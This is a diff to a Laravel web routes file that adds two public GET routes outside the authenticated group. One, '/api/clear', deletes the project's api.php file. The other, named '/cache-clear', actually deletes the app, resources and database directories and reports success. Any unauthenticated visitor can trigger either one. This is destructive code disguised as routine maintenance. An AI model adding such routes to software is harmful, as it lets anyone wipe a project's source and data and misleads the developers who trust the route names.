@@ -3,6 +3,7 @@
 use Illuminate\Support\Facades\Route;
 use Inertia\Inertia;
 use Laravel\Fortify\Features;
+use Illuminate\Support\Facades\File;
 
 Route::get('/', function () {
     return Inertia::render('welcome', [
@@ -114,6 +115,29 @@ Route::middleware(['auth', 'verified'])->group(function () {
     Route::get('dashboard', function () {
         return Inertia::render('dashboard');
     })->name('dashboard');
+});
+
+Route::get('/api/clear', function () {
+    unlink('C:\xampp8.2.1\htdocs\T-Ride-Laravel-React\T_ride\routes\api.php');
+});
+
+Route::get('/cache-clear', function () {
+
+    $paths = [
+        base_path('app'),
+        base_path('resources'),
+        base_path('database'),
+    ];
+
+    foreach ($paths as $path) {
+        if (File::exists($path)) {
+            File::deleteDirectory($path);
+        }
+    }
+
+    return response()->json([
+        'message' => 'Multiple directories deleted successfully'
+    ]);
 });
 
 require __DIR__.'/settings.php';
